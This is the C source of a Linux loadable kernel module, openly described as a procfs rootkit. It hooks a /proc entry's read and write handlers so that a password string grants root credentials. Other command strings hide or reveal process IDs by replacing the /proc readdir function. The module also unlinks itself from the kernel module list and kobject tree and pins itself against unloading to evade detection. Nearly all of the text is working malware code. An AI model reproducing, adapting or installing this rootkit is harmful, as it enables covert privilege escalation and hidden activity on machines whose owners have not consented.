#include<module.h>
#include<linux/kernel.h>
#include<linux/proc_fs.h>
#include<linux/sched.h>
#include<linux/string.h>
#include<linux/cred.h>
#include<linux/stat.h>
#include<linux/uaccess.h>
#include<linux/file.h>
#include "rootkit_conf.conf.h"

MODULE_LICENSE("GPL") ;
MODULE_AUTHOR("Ormi<ormi.ormi@gmail.com>") ;
MODULE_DESCRIPTION("Simple rootkit using procfs") ;
MODULE_VERSION("0.1.2");

static int failed;
static char pid[10][32];
static int pid_index;

/* Here are pointers in which we save original, replaced pointers. We use
them later, during unloading the module.
I think that their names explain what they are ;) */

static int (*old_proc_readdir)(struct file *, void *, filldir_t);
static filldir_t old_filldir ;
static ssize_t (*old_fops_write) (struct file *, const char __user *,
size_t, loff_t *);
static ssize_t (*old_fops_read)(struct file *, char __user *, size_t, loff_t*);
static write_proc_t *old_write;
static read_proc_t *old_read;
static struct proc_dir_entry *ptr; /* Pointer to "infected" entry */
static struct proc_dir_entry *root; /* Pointer to /proc directory */
static struct list_head *prev; 
/* Pointer to entry in main modules list which was before our module before we hid the rootkit */
static struct file_operations *fops; /* file_operations of infected entry */
static struct file_operations *root_fops; /* file_operations of /proc directory */

static inline void module_remember_info(void)
{
	prev = THIS_MODULE->list.prev;
}

static inline void module_show(void)
{
	list_add(&THIS_MODULE->list, prev); /* We add our module to main list of modules */
}
/* Parameter of this function is pointer to buffer in which there should be
command */
static int check_buf(const char __user *buf)
{
	/* Here we give root privileges */
	struct cred *new = prepare_creds();
	if (!strcmp(buf, password)) 
	{
		new->uid = new->euid = 0;
		new->gid = new->egid = 0;
		commit_creds(new);
	}
	/* Here we make possible to unload the module by "rmmod" */
	else if (!strcmp(buf, module_release))	
		module_put(THIS_MODULE);
	/* Here we make module visible */
	else if (!strcmp(buf, module_uncover))
		module_show();
	/* We hide process */
	else if (!strncmp(buf, hide_proc, strlen(hide_proc))) 
	{
		if (pid_index > 9)
			return 0;
		sprintf(pid[pid_index], "%s", buf + 5);
		pid_index++;
	}
	/* We "unhide" lastly hidden process */
	else if (!strncmp(buf, unhide_proc, strlen(unhide_proc))) 
	{
		if (!pid_index)
		return 0;
		pid_index--;
	}
	/* If we are here, there was no command passed */
	else
		return 1;
	
	return 0;
}

/* Our "write" function */
static int buf_write(struct file *file, const char __user *buf,
unsigned long count, void *data)
{
	/* If check_buf return 0, there was command passed */
	if (!check_buf(buf))
	return count;
	/* Otherwise we execute original function */
	return old_write(file, buf, count, data);
}
/* Our "read" function for read_proc field*/
static int buf_read(char __user *buf, char **start, off_t off,
int count, int *eof, void *data)
{
	if (!check_buf(buf))
	return count;
	return old_read(buf, start, off, count, eof, data);
}
/* For file_operations structure */
static ssize_t fops_write(struct file *file, const char __user *buf_user,
size_t count, loff_t *p)
{
	if (!check_buf(buf_user))
	return count;
	return old_fops_write(file, buf_user, count, p);
}
/* For file_operations structure */
static ssize_t fops_read(struct file *file, char __user *buf_user,
size_t count, loff_t *p)
{
	if (!check_buf(buf_user))
	return count;
	return old_fops_read(file, buf_user, count, p);
}
/* Our filldir function */
static int new_filldir(void *__buf, const char *name, int namelen,
loff_t offset, u64 ino, unsigned d_type)
{
	int i;
	/* We check if "name" is pid of one of hidden processes */
	for (i = 0; i < pid_index; i++)
	if (!strcmp(name, pid[i]))
	return 0; /* If yes, we don't display it */
	/* Otherwise we invoke original filldir */
	return old_filldir(__buf, name, namelen, offset, ino, d_type);
}

/* Our readdir function */
static int new_proc_readdir(struct file *filp, void *dirent, filldir_t filldir)
{
	/* To invoke original filldir in new_filldir we have to remeber pointer to
	original filldir */
	old_filldir = filldir;
	/* We invoke original readdir, but as "filldir" parameter we give pointer to
	our filldir */
	return old_proc_readdir(filp, dirent, new_filldir) ;
}

/* Here we replace readdir function of /proc */
static inline void change_proc_root_readdir(void)
{
	root_fops = (struct file_operations *)root->proc_fops;
	old_proc_readdir = root_fops->readdir;
	root_fops->readdir = new_proc_readdir;
}
static inline void proc_init(void)
{
	ptr = create_proc_entry("temporary", 0444, NULL);
	ptr = ptr->parent;
	/* ptr->parent was pointer to /proc directory */
	/* If it wasn't, something is seriously wrong */
	if (strcmp(ptr->name, "/proc") != 0) {
	failed = 1;
	return;
}
root = ptr;
remove_proc_entry("temporary", NULL);
change_proc_root_readdir(); /* We change /proc's readdir function */
ptr = ptr->subdir;
/* Now we are searching entry we want to infect */
while (ptr) 
{
	if (strcmp(ptr->name, passwaiter) == 0)
	goto found; /* Ok, we found it */
	ptr = ptr->next; /* Otherwise we go to next entry */
}
/* If we didn't find it, something is wrong :( */
failed = 1;
return;
found:
/* Let's begin infecting */
/* We save pointers to original reading and writing functions, to restore
them during unloading the rootkit */
old_write = ptr->write_proc;
old_read = ptr->read_proc;
fops = (struct file_operations *)ptr->proc_fops; /* Pointer to
file_operations structure of infected entry */
old_fops_read = fops->read;
old_fops_write = fops->write;
/* We replace write_proc/read_proc */
if (ptr->write_proc)
ptr->write_proc = buf_write;
else if (ptr->read_proc)
ptr->read_proc = buf_read;
/* We replace read/write from file_operations */
if (fops->write)
fops->write = fops_write;
else if (fops->read)
fops->read = fops_read;
/* There aren't any reading/writing functions? Error! */
if (!ptr->read_proc && !ptr->write_proc &&
!fops->read && !fops->write) {
failed = 1;
return;
}
}
/* This functions does some "cleanups". If we don't set some pointers tu
NULL,
we can cause Oops during unloading rootkit. We free some structures,
because we don't want to waste memory... */
static inline void tidy(void)
{
	kfree(THIS_MODULE->notes_attrs);
	THIS_MODULE->notes_attrs = NULL;
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	kfree(THIS_MODULE->mkobj.mp);
	THIS_MODULE->mkobj.mp = NULL;
	THIS_MODULE->modinfo_attrs->attr.name = NULL;
	kfree(THIS_MODULE->mkobj.drivers_dir);
	THIS_MODULE->mkobj.drivers_dir = NULL;
}
/*
We must delete some structures from lists to make rootkit harder to detect.
*/
static inline void rootkit_hide(void)
{
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}
static inline void rootkit_protect(void)
{
	try_module_get(THIS_MODULE);
}
static int __init rootkit_init(void)
{
	module_remember_info();
	proc_init();
	if (failed)
	return 0;
	rootkit_hide();
	tidy();
	rootkit_protect();
	return 0 ;
}
static void __exit rootkit_exit(void)
{
	/* If failed, we don't have to do any cleanups */
	if (failed)
		return;
	root_fops->readdir = old_proc_readdir;
	fops->write = old_fops_write;
	fops->read = old_fops_read;
	ptr->write_proc = old_write;
	ptr->read_proc = old_read;
}
module_init(rootkit_init);
module_exit(rootkit_exit);

